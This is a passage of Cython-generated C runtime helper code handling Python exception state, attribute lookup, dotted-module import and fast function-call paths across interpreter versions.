(unlikely(PyErr_Occurred())) __PYX_ERR(0, 1, __pyx_L1_error)\n\n  return 0;\n  __pyx_L1_error:;\n  return -1;\n}\n\n\n\n\n#ifdef _MSC_VER\n#pragma warning( push )\n\n#pragma warning( disable : 4127 )\n#endif\n\n\n\n\n\n\n\n#if CYTHON_REFNANNY\nstatic __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {\n    PyObject *m = NULL, *p = NULL;\n    void *r = NULL;\n    m = PyImport_ImportModule(modname);\n    if (!m) goto end;\n    p = PyObject_GetAttrString(m, "RefNannyAPI");\n    if (!p) goto end;\n    r = PyLong_AsVoidPtr(p);\nend:\n    Py_XDECREF(p);\n    Py_XDECREF(m);\n    return (__Pyx_RefNannyAPIStruct *)r;\n}\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\nstatic int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\n    Py_ssize_t i, n;\n    n = PyTuple_GET_SIZE(tuple);\n    for (i=0; i<n; i++) {\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\n    }\n    for (i=0; i<n; i++) {\n        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;\n    }\n    return 0;\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {\n    int result;\n    PyObject *exc_type;\n#if PY_VERSION_HEX >= 0x030C00A6\n    PyObject *current_exception = tstate->current_exception;\n    if (unlikely(!current_exception)) return 0;\n    exc_type = (PyObject*) Py_TYPE(current_exception);\n    if (exc_type == err) return 1;\n#else\n    exc_type = tstate->curexc_type;\n    if (exc_type == err) return 1;\n    if (unlikely(!exc_type)) return 0;\n#endif\n    #if CYTHON_AVOID_BORROWED_REFS\n    Py_INCREF(exc_type);\n    #endif\n    if (unlikely(PyTuple_Check(err))) {\n        result = __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);\n    } else {\n        result = __Pyx_PyErr_GivenExceptionMatches(exc_type, err);\n    }\n    #if CYTHON_AVOID_BORROWED_REFS\n    Py_DECREF(exc_type);\n    #endif\n    return result;\n}\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n#if PY_VERSION_HEX >= 0x030C00A6\n    PyObject *tmp_value;\n    assert(type == NULL || (value != NULL && type == (PyObject*) Py_TYPE(value)));\n    if (value) {\n        #if CYTHON_COMPILING_IN_CPYTHON\n        if (unlikely(((PyBaseExceptionObject*) value)->traceback != tb))\n        #endif\n            PyException_SetTraceback(value, tb);\n    }\n    tmp_value = tstate->current_exception;\n    tstate->current_exception = value;\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(type);\n    Py_XDECREF(tb);\n#else\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    tmp_type = tstate->curexc_type;\n    tmp_value = tstate->curexc_value;\n    tmp_tb = tstate->curexc_traceback;\n    tstate->curexc_type = type;\n    tstate->curexc_value = value;\n    tstate->curexc_traceback = tb;\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n#endif\n}\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n#if PY_VERSION_HEX >= 0x030C00A6\n    PyObject* exc_value;\n    exc_value = tstate->current_exception;\n    tstate->current_exception = 0;\n    *value = exc_value;\n    *type = NULL;\n    *tb = NULL;\n    if (exc_value) {\n        *type = (PyObject*) Py_TYPE(exc_value);\n        Py_INCREF(*type);\n        #if CYTHON_COMPILING_IN_CPYTHON\n        *tb = ((PyBaseExceptionObject*) exc_value)->traceback;\n        Py_XINCREF(*tb);\n        #else\n        *tb = PyException_GetTraceback(exc_value);\n        #endif\n    }\n#else\n    *type = tstate->curexc_type;\n    *value = tstate->curexc_value;\n    *tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->curexc_value = 0;\n    tstate->curexc_traceback = 0;\n#endif\n}\n#endif\n\n\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {\n    PyTypeObject* tp = Py_TYPE(obj);\n    if (likely(tp->tp_getattro))\n        return tp->tp_getattro(obj, attr_name);\n    return PyObject_GetAttr(obj, attr_name);\n}\n#endif\n\n\n#if __PYX_LIMITED_VERSION_HEX < 0x030d0000\nstatic void __Pyx_PyObject_GetAttrStr_ClearAttributeError(void) {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    if (likely(__Pyx_PyErr_ExceptionMatches(PyExc_AttributeError)))\n        __Pyx_PyErr_Clear();\n}\n#endif\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name) {\n    PyObject *result;\n#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n    (void) PyObject_GetOptionalAttr(obj, attr_name, &result);\n    return result;\n#else\n#if CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_TYPE_SLOTS\n    PyTypeObject* tp = Py_TYPE(obj);\n    if (likely(tp->tp_getattro == PyObject_GenericGetAttr)) {\n        return _PyObject_GenericGetAttrWithDict(obj, attr_name, NULL, 1);\n    }\n#endif\n    result = __Pyx_PyObject_GetAttrStr(obj, attr_name);\n    if (unlikely(!result)) {\n        __Pyx_PyObject_GetAttrStr_ClearAttributeError();\n    }\n    return result;\n#endif\n}\n\n\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name) {\n    PyObject* result = __Pyx_PyObject_GetAttrStrNoError(__pyx_mstate_global->__pyx_b, name);\n    if (unlikely(!result) && !PyErr_Occurred()) {\n        PyErr_Format(PyExc_NameError,\n            "name \'%U\' is not defined", name);\n    }\n    return result;\n}\n\n\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {\n    PyObject *module = 0;\n    PyObject *empty_dict = 0;\n    PyObject *empty_list = 0;\n    empty_dict = PyDict_New();\n    if (unlikely(!empty_dict))\n        goto bad;\n    if (level == -1) {\n        const char* package_sep = strchr(__Pyx_MODULE_NAME, \'.\');\n        if (package_sep != (0)) {\n            module = PyImport_ImportModuleLevelObject(\n                name, __pyx_mstate_global->__pyx_d, empty_dict, from_list, 1);\n            if (unlikely(!module)) {\n                if (unlikely(!PyErr_ExceptionMatches(PyExc_ImportError)))\n                    goto bad;\n                PyErr_Clear();\n            }\n        }\n        level = 0;\n    }\n    if (!module) {\n        module = PyImport_ImportModuleLevelObject(\n            name, __pyx_mstate_global->__pyx_d, empty_dict, from_list, level);\n    }\nbad:\n    Py_XDECREF(empty_dict);\n    Py_XDECREF(empty_list);\n    return module;\n}\n\n\nstatic PyObject *__Pyx__ImportDottedModule_Error(PyObject *name, PyObject *parts_tuple, Py_ssize_t count) {\n    PyObject *partial_name = NULL, *slice = NULL, *sep = NULL;\n    Py_ssize_t size;\n    if (unlikely(PyErr_Occurred())) {\n        PyErr_Clear();\n    }\n#if CYTHON_ASSUME_SAFE_SIZE\n    size = PyTuple_GET_SIZE(parts_tuple);\n#else\n    size = PyTuple_Size(parts_tuple);\n    if (size < 0) goto bad;\n#endif\n    if (likely(size == count)) {\n        partial_name = name;\n    } else {\n        slice = PySequence_GetSlice(parts_tuple, 0, count);\n        if (unlikely(!slice))\n            goto bad;\n        sep = PyUnicode_FromStringAndSize(".", 1);\n        if (unlikely(!sep))\n            goto bad;\n        partial_name = PyUnicode_Join(sep, slice);\n    }\n    PyErr_Format(\n        PyExc_ModuleNotFoundError,\n        "No module named \'%U\'", partial_name);\nbad:\n    Py_XDECREF(sep);\n    Py_XDECREF(slice);\n    Py_XDECREF(partial_name);\n    return NULL;\n}\nstatic PyObject *__Pyx__ImportDottedModule_Lookup(PyObject *name) {\n    PyObject *imported_module;\n#if (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM  < 0x07030400) ||\\\n        CYTHON_COMPILING_IN_GRAAL\n    PyObject *modules = PyImport_GetModuleDict();\n    if (unlikely(!modules))\n        return NULL;\n    imported_module = __Pyx_PyDict_GetItemStr(modules, name);\n    Py_XINCREF(imported_module);\n#else\n    imported_module = PyImport_GetModule(name);\n#endif\n    return imported_module;\n}\nstatic PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple) {\n    Py_ssize_t i, nparts;\n#if CYTHON_ASSUME_SAFE_SIZE\n    nparts = PyTuple_GET_SIZE(parts_tuple);\n#else\n    nparts = PyTuple_Size(parts_tuple);\n    if (nparts < 0) return NULL;\n#endif\n    for (i=1; i < nparts && module; i++) {\n        PyObject *part, *submodule;\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n        part = PyTuple_GET_ITEM(parts_tuple, i);\n#else\n        part = __Pyx_PySequence_ITEM(parts_tuple, i);\n        if (!part) return NULL;\n#endif\n        submodule = __Pyx_PyObject_GetAttrStrNoError(module, part);\n#if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)\n        Py_DECREF(part);\n#endif\n        Py_DECREF(module);\n        module = submodule;\n    }\n    if (unlikely(!module)) {\n        return __Pyx__ImportDottedModule_Error(name, parts_tuple, i);\n    }\n    return module;\n}\nstatic PyObject *__Pyx__ImportDottedModule(PyObject *name, PyObject *parts_tuple) {\n    PyObject *imported_module;\n    PyObject *module = __Pyx_Import(name, NULL, 0);\n    if (!parts_tuple || unlikely(!module))\n        return module;\n    imported_module = __Pyx__ImportDottedModule_Lookup(name);\n    if (likely(imported_module)) {\n        Py_DECREF(module);\n        return imported_module;\n    }\n    PyErr_Clear();\n    return __Pyx_ImportDottedModule_WalkParts(module, name, parts_tuple);\n}\nstatic PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple) {\n#if CYTHON_COMPILING_IN_CPYTHON\n    PyObject *module = __Pyx__ImportDottedModule_Lookup(name);\n    if (likely(module)) {\n        PyObject *spec = __Pyx_PyObject_GetAttrStrNoError(module, __pyx_mstate_global->__pyx_n_u_spec);\n        if (likely(spec)) {\n            PyObject *unsafe = __Pyx_PyObject_GetAttrStrNoError(spec, __pyx_mstate_global->__pyx_n_u_initializing);\n            if (likely(!unsafe || !__Pyx_PyObject_IsTrue(unsafe))) {\n                Py_DECREF(spec);\n                spec = NULL;\n            }\n            Py_XDECREF(unsafe);\n        }\n        if (likely(!spec)) {\n            PyErr_Clear();\n            return module;\n        }\n        Py_DECREF(spec);\n        Py_DECREF(module);\n    } else if (PyErr_Occurred()) {\n        PyErr_Clear();\n    }\n#endif\n    return __Pyx__ImportDottedModule(name, parts_tuple);\n}\n\n\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {\n    PyObject **dictptr = NULL;\n    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;\n    if (offset) {\n#if CYTHON_COMPILING_IN_CPYTHON\n        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);\n#else\n        dictptr = _PyObject_GetDictPtr(obj);\n#endif\n    }\n    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;\n}\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))\n        return 0;\n    return obj_dict_version == __Pyx_get_object_dict_version(obj);\n}\n#endif\n\n\n#if CYTHON_USE_DICT_VERSIONS\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)\n#else\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)\n#endif\n{\n    PyObject *result;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    if (unlikely(!__pyx_m)) {\n        if (!PyErr_Occurred())\n            PyErr_SetNone(PyExc_NameError);\n        return NULL;\n    }\n    result = PyObject_GetAttr(__pyx_m, name);\n    if (likely(result)) {\n        return result;\n    }\n    PyErr_Clear();\n#elif CYTHON_AVOID_BORROWED_REFS || CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n    if (unlikely(__Pyx_PyDict_GetItemRef(__pyx_mstate_global->__pyx_d, name, &result) == -1)) PyErr_Clear();\n    __PYX_UPDATE_DICT_CACHE(__pyx_mstate_global->__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return result;\n    }\n#else\n    result = _PyDict_GetItem_KnownHash(__pyx_mstate_global->__pyx_d, name, ((PyASCIIObject *) name)->hash);\n    __PYX_UPDATE_DICT_CACHE(__pyx_mstate_global->__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n    PyErr_Clear();\n#endif\n    return __Pyx_GetBuiltinName(name);\n}\n\n\n#if CYTHON_FAST_PYCALL && !CYTHON_VECTORCALL\nstatic PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject *const *args, Py_ssize_t na,\n                                               PyObject *globals) {\n    PyFrameObject *f;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject **fastlocals;\n    Py_ssize_t i;\n    PyObject *result;\n    assert(globals != NULL);\n    \n    assert(tstate != NULL);\n    f = PyFrame_New(tstate, co, globals, NULL);\n    if (f == NULL) {\n        return NULL;\n    }\n    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);\n    for (i = 0; i < na; i++) {\n        Py_INCREF(*args);\n        fastlocals[i] = *args++;\n    }\n    result = PyEval_EvalFrameEx(f,0);\n    ++tstate->recursion_depth;\n    Py_DECREF(f);\n    --tstate->recursion_depth;\n    return result;\n}\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject *const *args, Py_ssize_t nargs, PyObject *kwargs) {\n    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);\n    PyObject *globals = PyFunction_GET_GLOBALS(func);\n    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);\n    PyObject *closure;\n    PyObject *kwdefs;\n    PyObject *kwtuple, **k;\n    PyObject **d;\n    Py_ssize_t nd;\n    Py_ssize_t nk;\n    PyObject *result;\n    assert(kwargs == NULL || PyDict_Check(kwargs));\n    nk = kwargs ? PyDict_Size(kwargs) : 0;\n    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object"))) {\n        return NULL;\n    }\n    if (\n            co->co_kwonlyargcount == 0 &&\n            likely(kwargs == NULL || nk == 0) &&\n            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {\n        if (argdefs == NULL && co->co_argcount == nargs) {\n            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);\n            goto done;\n        }\n        else if (nargs == 0 && argdefs != NULL\n                 && co->co_argcount == Py_SIZE(argdefs)) {\n            \n            args = &PyTuple_GET_ITEM(argdefs, 0);\n            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);\n            goto done;\n        }\n    }\n    if (kwargs != NULL) {\n        Py_ssize_t pos, i;\n        kwtuple = PyTuple_New(2 * nk);\n        if (kwtuple == NULL) {\n            result = NULL;\n            goto done;\n        }\n        k = &PyTuple_GET_ITEM(kwtuple, 0);\n        pos = i = 0;\n        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {\n            Py_INCREF(k[i]);\n            Py_INCREF(k[i+1]);\n            i += 2;\n        }\n        nk = i / 2;\n    }\n    else {\n        kwtuple = NULL;\n        k = NULL;\n    }\n    closure = PyFunction_GET_CLOSURE(func);\n    kwdefs = PyFunction_GET_KW_DEFAULTS(func);\n    if (argdefs != NULL) {\n        d = &PyTuple_GET_ITEM(argdefs, 0);\n        nd = Py_SIZE(argdefs);\n    }\n    else {\n        d = NULL;\n        nd = 0;\n    }\n    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,\n                               args, (int)nargs,\n                               k, (int)nk,\n                               d, (int)nd, kwdefs, closure);\n    Py_XDECREF(kwtuple);\ndone:\n    Py_LeaveRecursiveCall();\n    return result;\n}\n#endif\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {\n    PyObject *result;\n    ternaryfunc call = Py_TYPE(func)->tp_call;\n    if (unlikely(!call))\n        return PyObject_Call(func, arg, kw);\n    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object")))\n        return NULL;\n    result = (*call)(func, arg, kw);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            "NULL result without error in PyObject_Call");\n    }\n    return result;\n}\n#endif\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {\n    PyObject *self, *result;\n    PyCFunction cfunc;\n    cfunc = __Pyx_CyOrPyCFunction_GET_FUNCTION(func);\n    self = __Pyx_CyOrPyCFunction_GET_SELF(func);\n    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object")))\n        return NULL;\n    result = cfunc(self, arg);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            "NULL result without error in PyObject_Call");\n    }\n    return result;\n}\n#endif\n\n\n#if PY_VERSION_HEX < 0x03090000 || CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject* __Pyx_PyObject_FastCall_fallback(PyObject *func, PyObject * const*args, size_t nargs, PyObject *kwargs) {\n    PyObject *argstuple;\n    PyObject *result = 0;\n    size_t i;\n    argstuple = PyTuple_New((Py_ssize_t)nargs);\n    if (unlikely(!argstuple)) return NULL;\n    for (i = 0; i < nargs; i++) {\n        Py_INCREF(args[i]);\n        if (__Pyx_PyTuple_SET_ITEM(argstuple, (Py_ssize_t)i, args[i]) != (0)) goto bad;\n    }\n    result = __Pyx_PyObject_Call(func, argstuple, kwargs);\n  bad:\n    Py_DECREF(argstuple);\n    return result;\n}\n#endif\n#if CYTHON_VECTORCALL && !CYTHON_COMPILING_IN_LIMITED_API\n  #if PY_VERSION_HEX < 0x03090000\n    #define __Pyx_PyVectorcall_Function(callable) _PyVectorcall_Function(callable)\n  #elif CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE vectorcallfunc __Pyx_PyVectorcall_Function(PyObject *callable) {\n    PyTypeObject *tp = Py_TYPE(callable);\n    #if defined(__Pyx_CyFunction_USED)\n    if (__Pyx_CyFunction_CheckExact(callable)) {\n        return __Pyx_CyFunction_func_vectorcall(callable);\n    }\n    #endif\n    if (!PyType_HasFeature(tp, Py_TPFLAGS_HAVE_VECTORCALL)) {\n        return NULL;\n    }\n    assert(PyCallable_Check(callable));\n    Py_ssize_t offset = tp->tp_vectorcall_offset;\n    assert(offset > 0);\n    vectorcallfunc ptr;\n    memcpy(&ptr, (char *) callable + offset, sizeof(ptr));\n    return ptr;\n}\n  #else\n    #define __Pyx_PyVectorcall_Function(callable) PyVectorcall_Function(callable)\n  #endif\n#endif\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject *const *args, size_t _nargs, PyObject *kwargs) {\n    Py_ssize_t nargs = __Pyx_PyVectorcall_NARGS(_nargs);\n#if CYTHON_COMPILING_IN_CPYTHON\n    if (nargs == 0 && kwargs == NULL) {\n        if (__Pyx_CyOrPyCFunction_Check(func) && likely( __Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_NOARGS))\n            return __Pyx_PyObject_CallMethO(func, NULL);\n    }\n    else if (nargs == 1 && kwargs == NULL) {\n        if (__Pyx_CyOrPyCFunction_Check(func) && likely( __Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_O))\n            return __Pyx_PyObject_CallMethO(func, args[0]);\n    }\n#endif\n    #if PY_VERSION_HEX < 0x030800B1\n    #if CYTHON_FAST_PYCCALL\n    if (PyCFunction_Check(func)) {\n        if (kwargs) {\n            return _PyCFunction_FastCallDict(func, args, nargs, kwargs);\n        } else {\n            return _PyCFunction_FastCallKeywords(func, args, nargs, NULL);\n        }\n    }\n    if (!kwargs && __Pyx_IS_TYPE(func, &PyMethodDescr_Type)) {\n        return _PyMethodDescr_FastCallKeywords(func, args, nargs, NULL);\n    }\n    #endif\n    #if CYTHON_FAST_PYCALL\n    if (PyFunction_Check(func)) {\n        return __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs);\n    }\n    #endif\n    #endif\n    if (kwargs == NULL) {\n        #if CYTHON_VECTORCALL && !CYTHON_COMPILING_IN_LIMITED_API\n        vectorcallfunc f = __Pyx_PyVectorcall_Function(func);\n        if (f) {\n            return f(func, args, _nargs, NULL);\n        }\n        #elif defined(__Pyx_CyFunction_USED) && CYTHON_BACKPORT_VECTORCALL\n        if (__Pyx_CyFunction_CheckExact(func)) {\n            __pyx_vectorcallfunc f = __Pyx_CyFunction_func_vectorcall(func);\n            if (f) return f(func, args, _nargs, NULL);\n        }\n        #elif CYTHON_COMPILING_IN_LIMITED_API && CYTHON_VECTORCALL\n        return PyObject_Vectorcall(func, args, _nargs, NULL);\n        #endif\n    }\n    if (nargs == 0) {\n        return __Pyx_PyObject_Call(func, __pyx_mstate_global->__pyx_empty_tuple, kwargs);\n    }\n    #if PY_VERSION_HEX >= 0x03090000 && !CYTHON_COMPILING_IN_LIMITED_API\n    return PyObject_VectorcallDict(func, args, (size_t)nargs, kwargs);\n    #else\n    return __Pyx_PyObject_FastCall_fallback(func, args, (size_t)nargs, kwargs);\n    #endif\n}\n\n\n#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx__PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name, int with_error) {\n    PyObject *res;\n    PyTypeObject *tp = Py_TYPE(obj);\n    res = _PyType_Lookup(tp, attr_name);\n    if (likely(res)) {\n        descrgetfunc f = Py_TYPE(res)->tp_descr_get;\n        if (!f) {\n            Py_INCREF(res);\n        } else {\n            res = f(res, obj, (PyObject *)tp);\n        }\n    } else if (with_error) {\n        PyErr_SetObject(PyExc_AttributeError, attr_name);\n    }\n    return res;\n}\n#endif\n\n\n#if CYTHON_USE_EXC_INFO_STACK && CYTHON_FAST_THREAD_STATE\nstatic _PyErr_StackItem *\n__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)\n{\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    while ((exc_info->exc_value == NULL || exc_info->exc_value == Py_None) &&\n           exc_info->previous_item != NULL)\n    {\n        exc_info = exc_info->previous_item;\n    }\n    return exc_info;\n}\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4\n    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);\n    PyObject *exc_value = exc_info->exc_value;\n    if (exc_value == NULL || exc_value == Py_None) {\n        *value = NULL;\n        *type = NULL;\n        *tb = NULL;\n    } else {\n        *value = exc_value;\n        Py_INCREF(*value);\n        *type = (PyObject*) Py_TYPE(exc_value);\n        Py_INCREF(*type);\n        *tb = PyException_GetTraceback(exc_value);\n    }\n  #elif CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);\n    *type = exc_info->exc_type;\n    *value = exc_info->exc_value;\n    *tb = exc_info->exc_traceback;\n    Py_XINCREF(*type);\n    Py_XINCREF(*value);\n    Py_XINCREF(*tb);\n  #else\n    *type = tstate->exc_type;\n    *value = tstate->exc_value;\n    *tb = tstate->exc_traceback;\n    Py_XINCREF(*type);\n    Py_XINCREF(*value);\n    Py_XINCREF(*tb);\n  #endif\n}\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    PyObject *tmp_value = exc_info->exc_value;\n    exc_info->exc_value = value;\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(type);\n    Py_XDECREF(tb);\n  #else\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    #if CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    tmp_type = exc_info->exc_type;\n    tmp_value = exc_info->exc_value;\n    tmp_tb = exc_info->exc_traceback;\n    exc_info->exc_type = type;\n    exc_info->exc_value = value;\n    exc_info->exc_traceback = tb;\n    #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = type;\n    tstate->exc_value = value;\n    tstate->exc_traceback = tb;\n    #endif\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n  #endif\n}\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)\n#else\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)\n#endif\n{\n    PyObject *local_type = NULL, *local_value, *local_tb = NULL;\n#if CYTHON_FAST_THREAD_STATE\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n  #if PY_VERSION_HEX >= 0x030C0000\n    local_value = tstate->current_exception;\n    tstate->current_exception = 0;\n  #else\n    local_type = tstate->curexc_type;\n    local_value = tstate->curexc_value;\n    local_tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->curexc_value = 0;\n    tstate->curexc_traceback = 0;\n  #endif\n#elif __PYX_LIMITED_VERSION_HEX > 0x030C0000\n    local_value = PyErr_GetRaisedException();\n#else\n    PyErr_Fetch(&local_type, &local_value, &local_tb);\n#endif\n#if __PYX_LIMITED_VERSION_HEX > 0x030C0000\n    if (likely(local_value)) {\n        local_type = (PyObject*) Py_TYPE(local_value);\n        Py_INCREF(local_type);\n        local_tb = PyException_GetTraceback(local_value);\n    }\n#else\n    PyErr_NormalizeException(&local_type, &local_value, &local_tb);\n#if CYTHON_FAST_THREAD_STATE\n    if (unlikely(tstate->curexc_type))\n#else\n    if (unlikely(PyErr_Occurred()))\n#endif\n        goto bad;\n    if (local_tb) {\n        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))\n            goto bad;\n    }\n#endif // __PYX_LIMITED_VERSION_HEX > 0x030C0000\n    Py_XINCREF(local_tb);\n    Py_XINCREF(local_type);\n    Py_XINCREF(local_value);\n    *type = local_type;\n    *value = local_value;\n    *tb = local_tb;\n#if CYTHON_FAST_THREAD_STATE\n    #if CYTHON_USE_EXC_INFO_STACK\n    {\n        _PyErr_StackItem *exc_info = tstate->exc_info;\n      #if PY_VERSION_HEX >= 0x030B00a4\n        tmp_value = exc_info->exc_value;\n        exc_info->exc_value = local_value;\n        tmp_type = NULL;\n        tmp_tb = NULL;\n        Py_XDECREF(local_type);\n        Py_XDECREF(local_tb);\n      #else\n        tmp_type = exc_info->exc_type;\n        tmp_value = exc_info->exc_value;\n        tmp_tb = exc_info->exc_traceback;\n        exc_info->exc_type = local_type;\n        exc_info->exc_value = local_value;\n        exc_info->exc_traceback = local_tb;\n      #endif\n    }\n    #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = local_type;\n    tstate->exc_value = local_value;\n    tstate->exc_traceback = local_tb;\n    #endif\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n#elif __PYX_LIMITED_VERSION_HEX >= 0x030b0000\n    PyErr_SetHandledException(local_value);\n    Py_XDECREF(local_value);\n    Py_XDECREF(local_type);\n    Py_XDECREF(local_tb);\n#else\n    PyErr_SetExcInfo(local_type, local_value, local_tb);\n#endif\n    return 0;\n#if __PYX_LIMITED_VERSION_HEX <= 0x030C0000\nbad:\n    *type = 0;\n    *value = 0;\n    *tb = 0;\n    Py_XDECREF(local_type);\n    Py_XDECREF(local_value);\n    Py_XDECREF(local_tb);\n    return -1;\n#endif\n}\n\n\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {\n    PyTypeObject* tp = Py_TYPE(obj);\n    if (likely(tp->tp_setattro))\n        return tp->tp_setattro(obj, attr_name, value);\n    return PyObject_SetAttr(obj, attr_name, value);\n}\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void 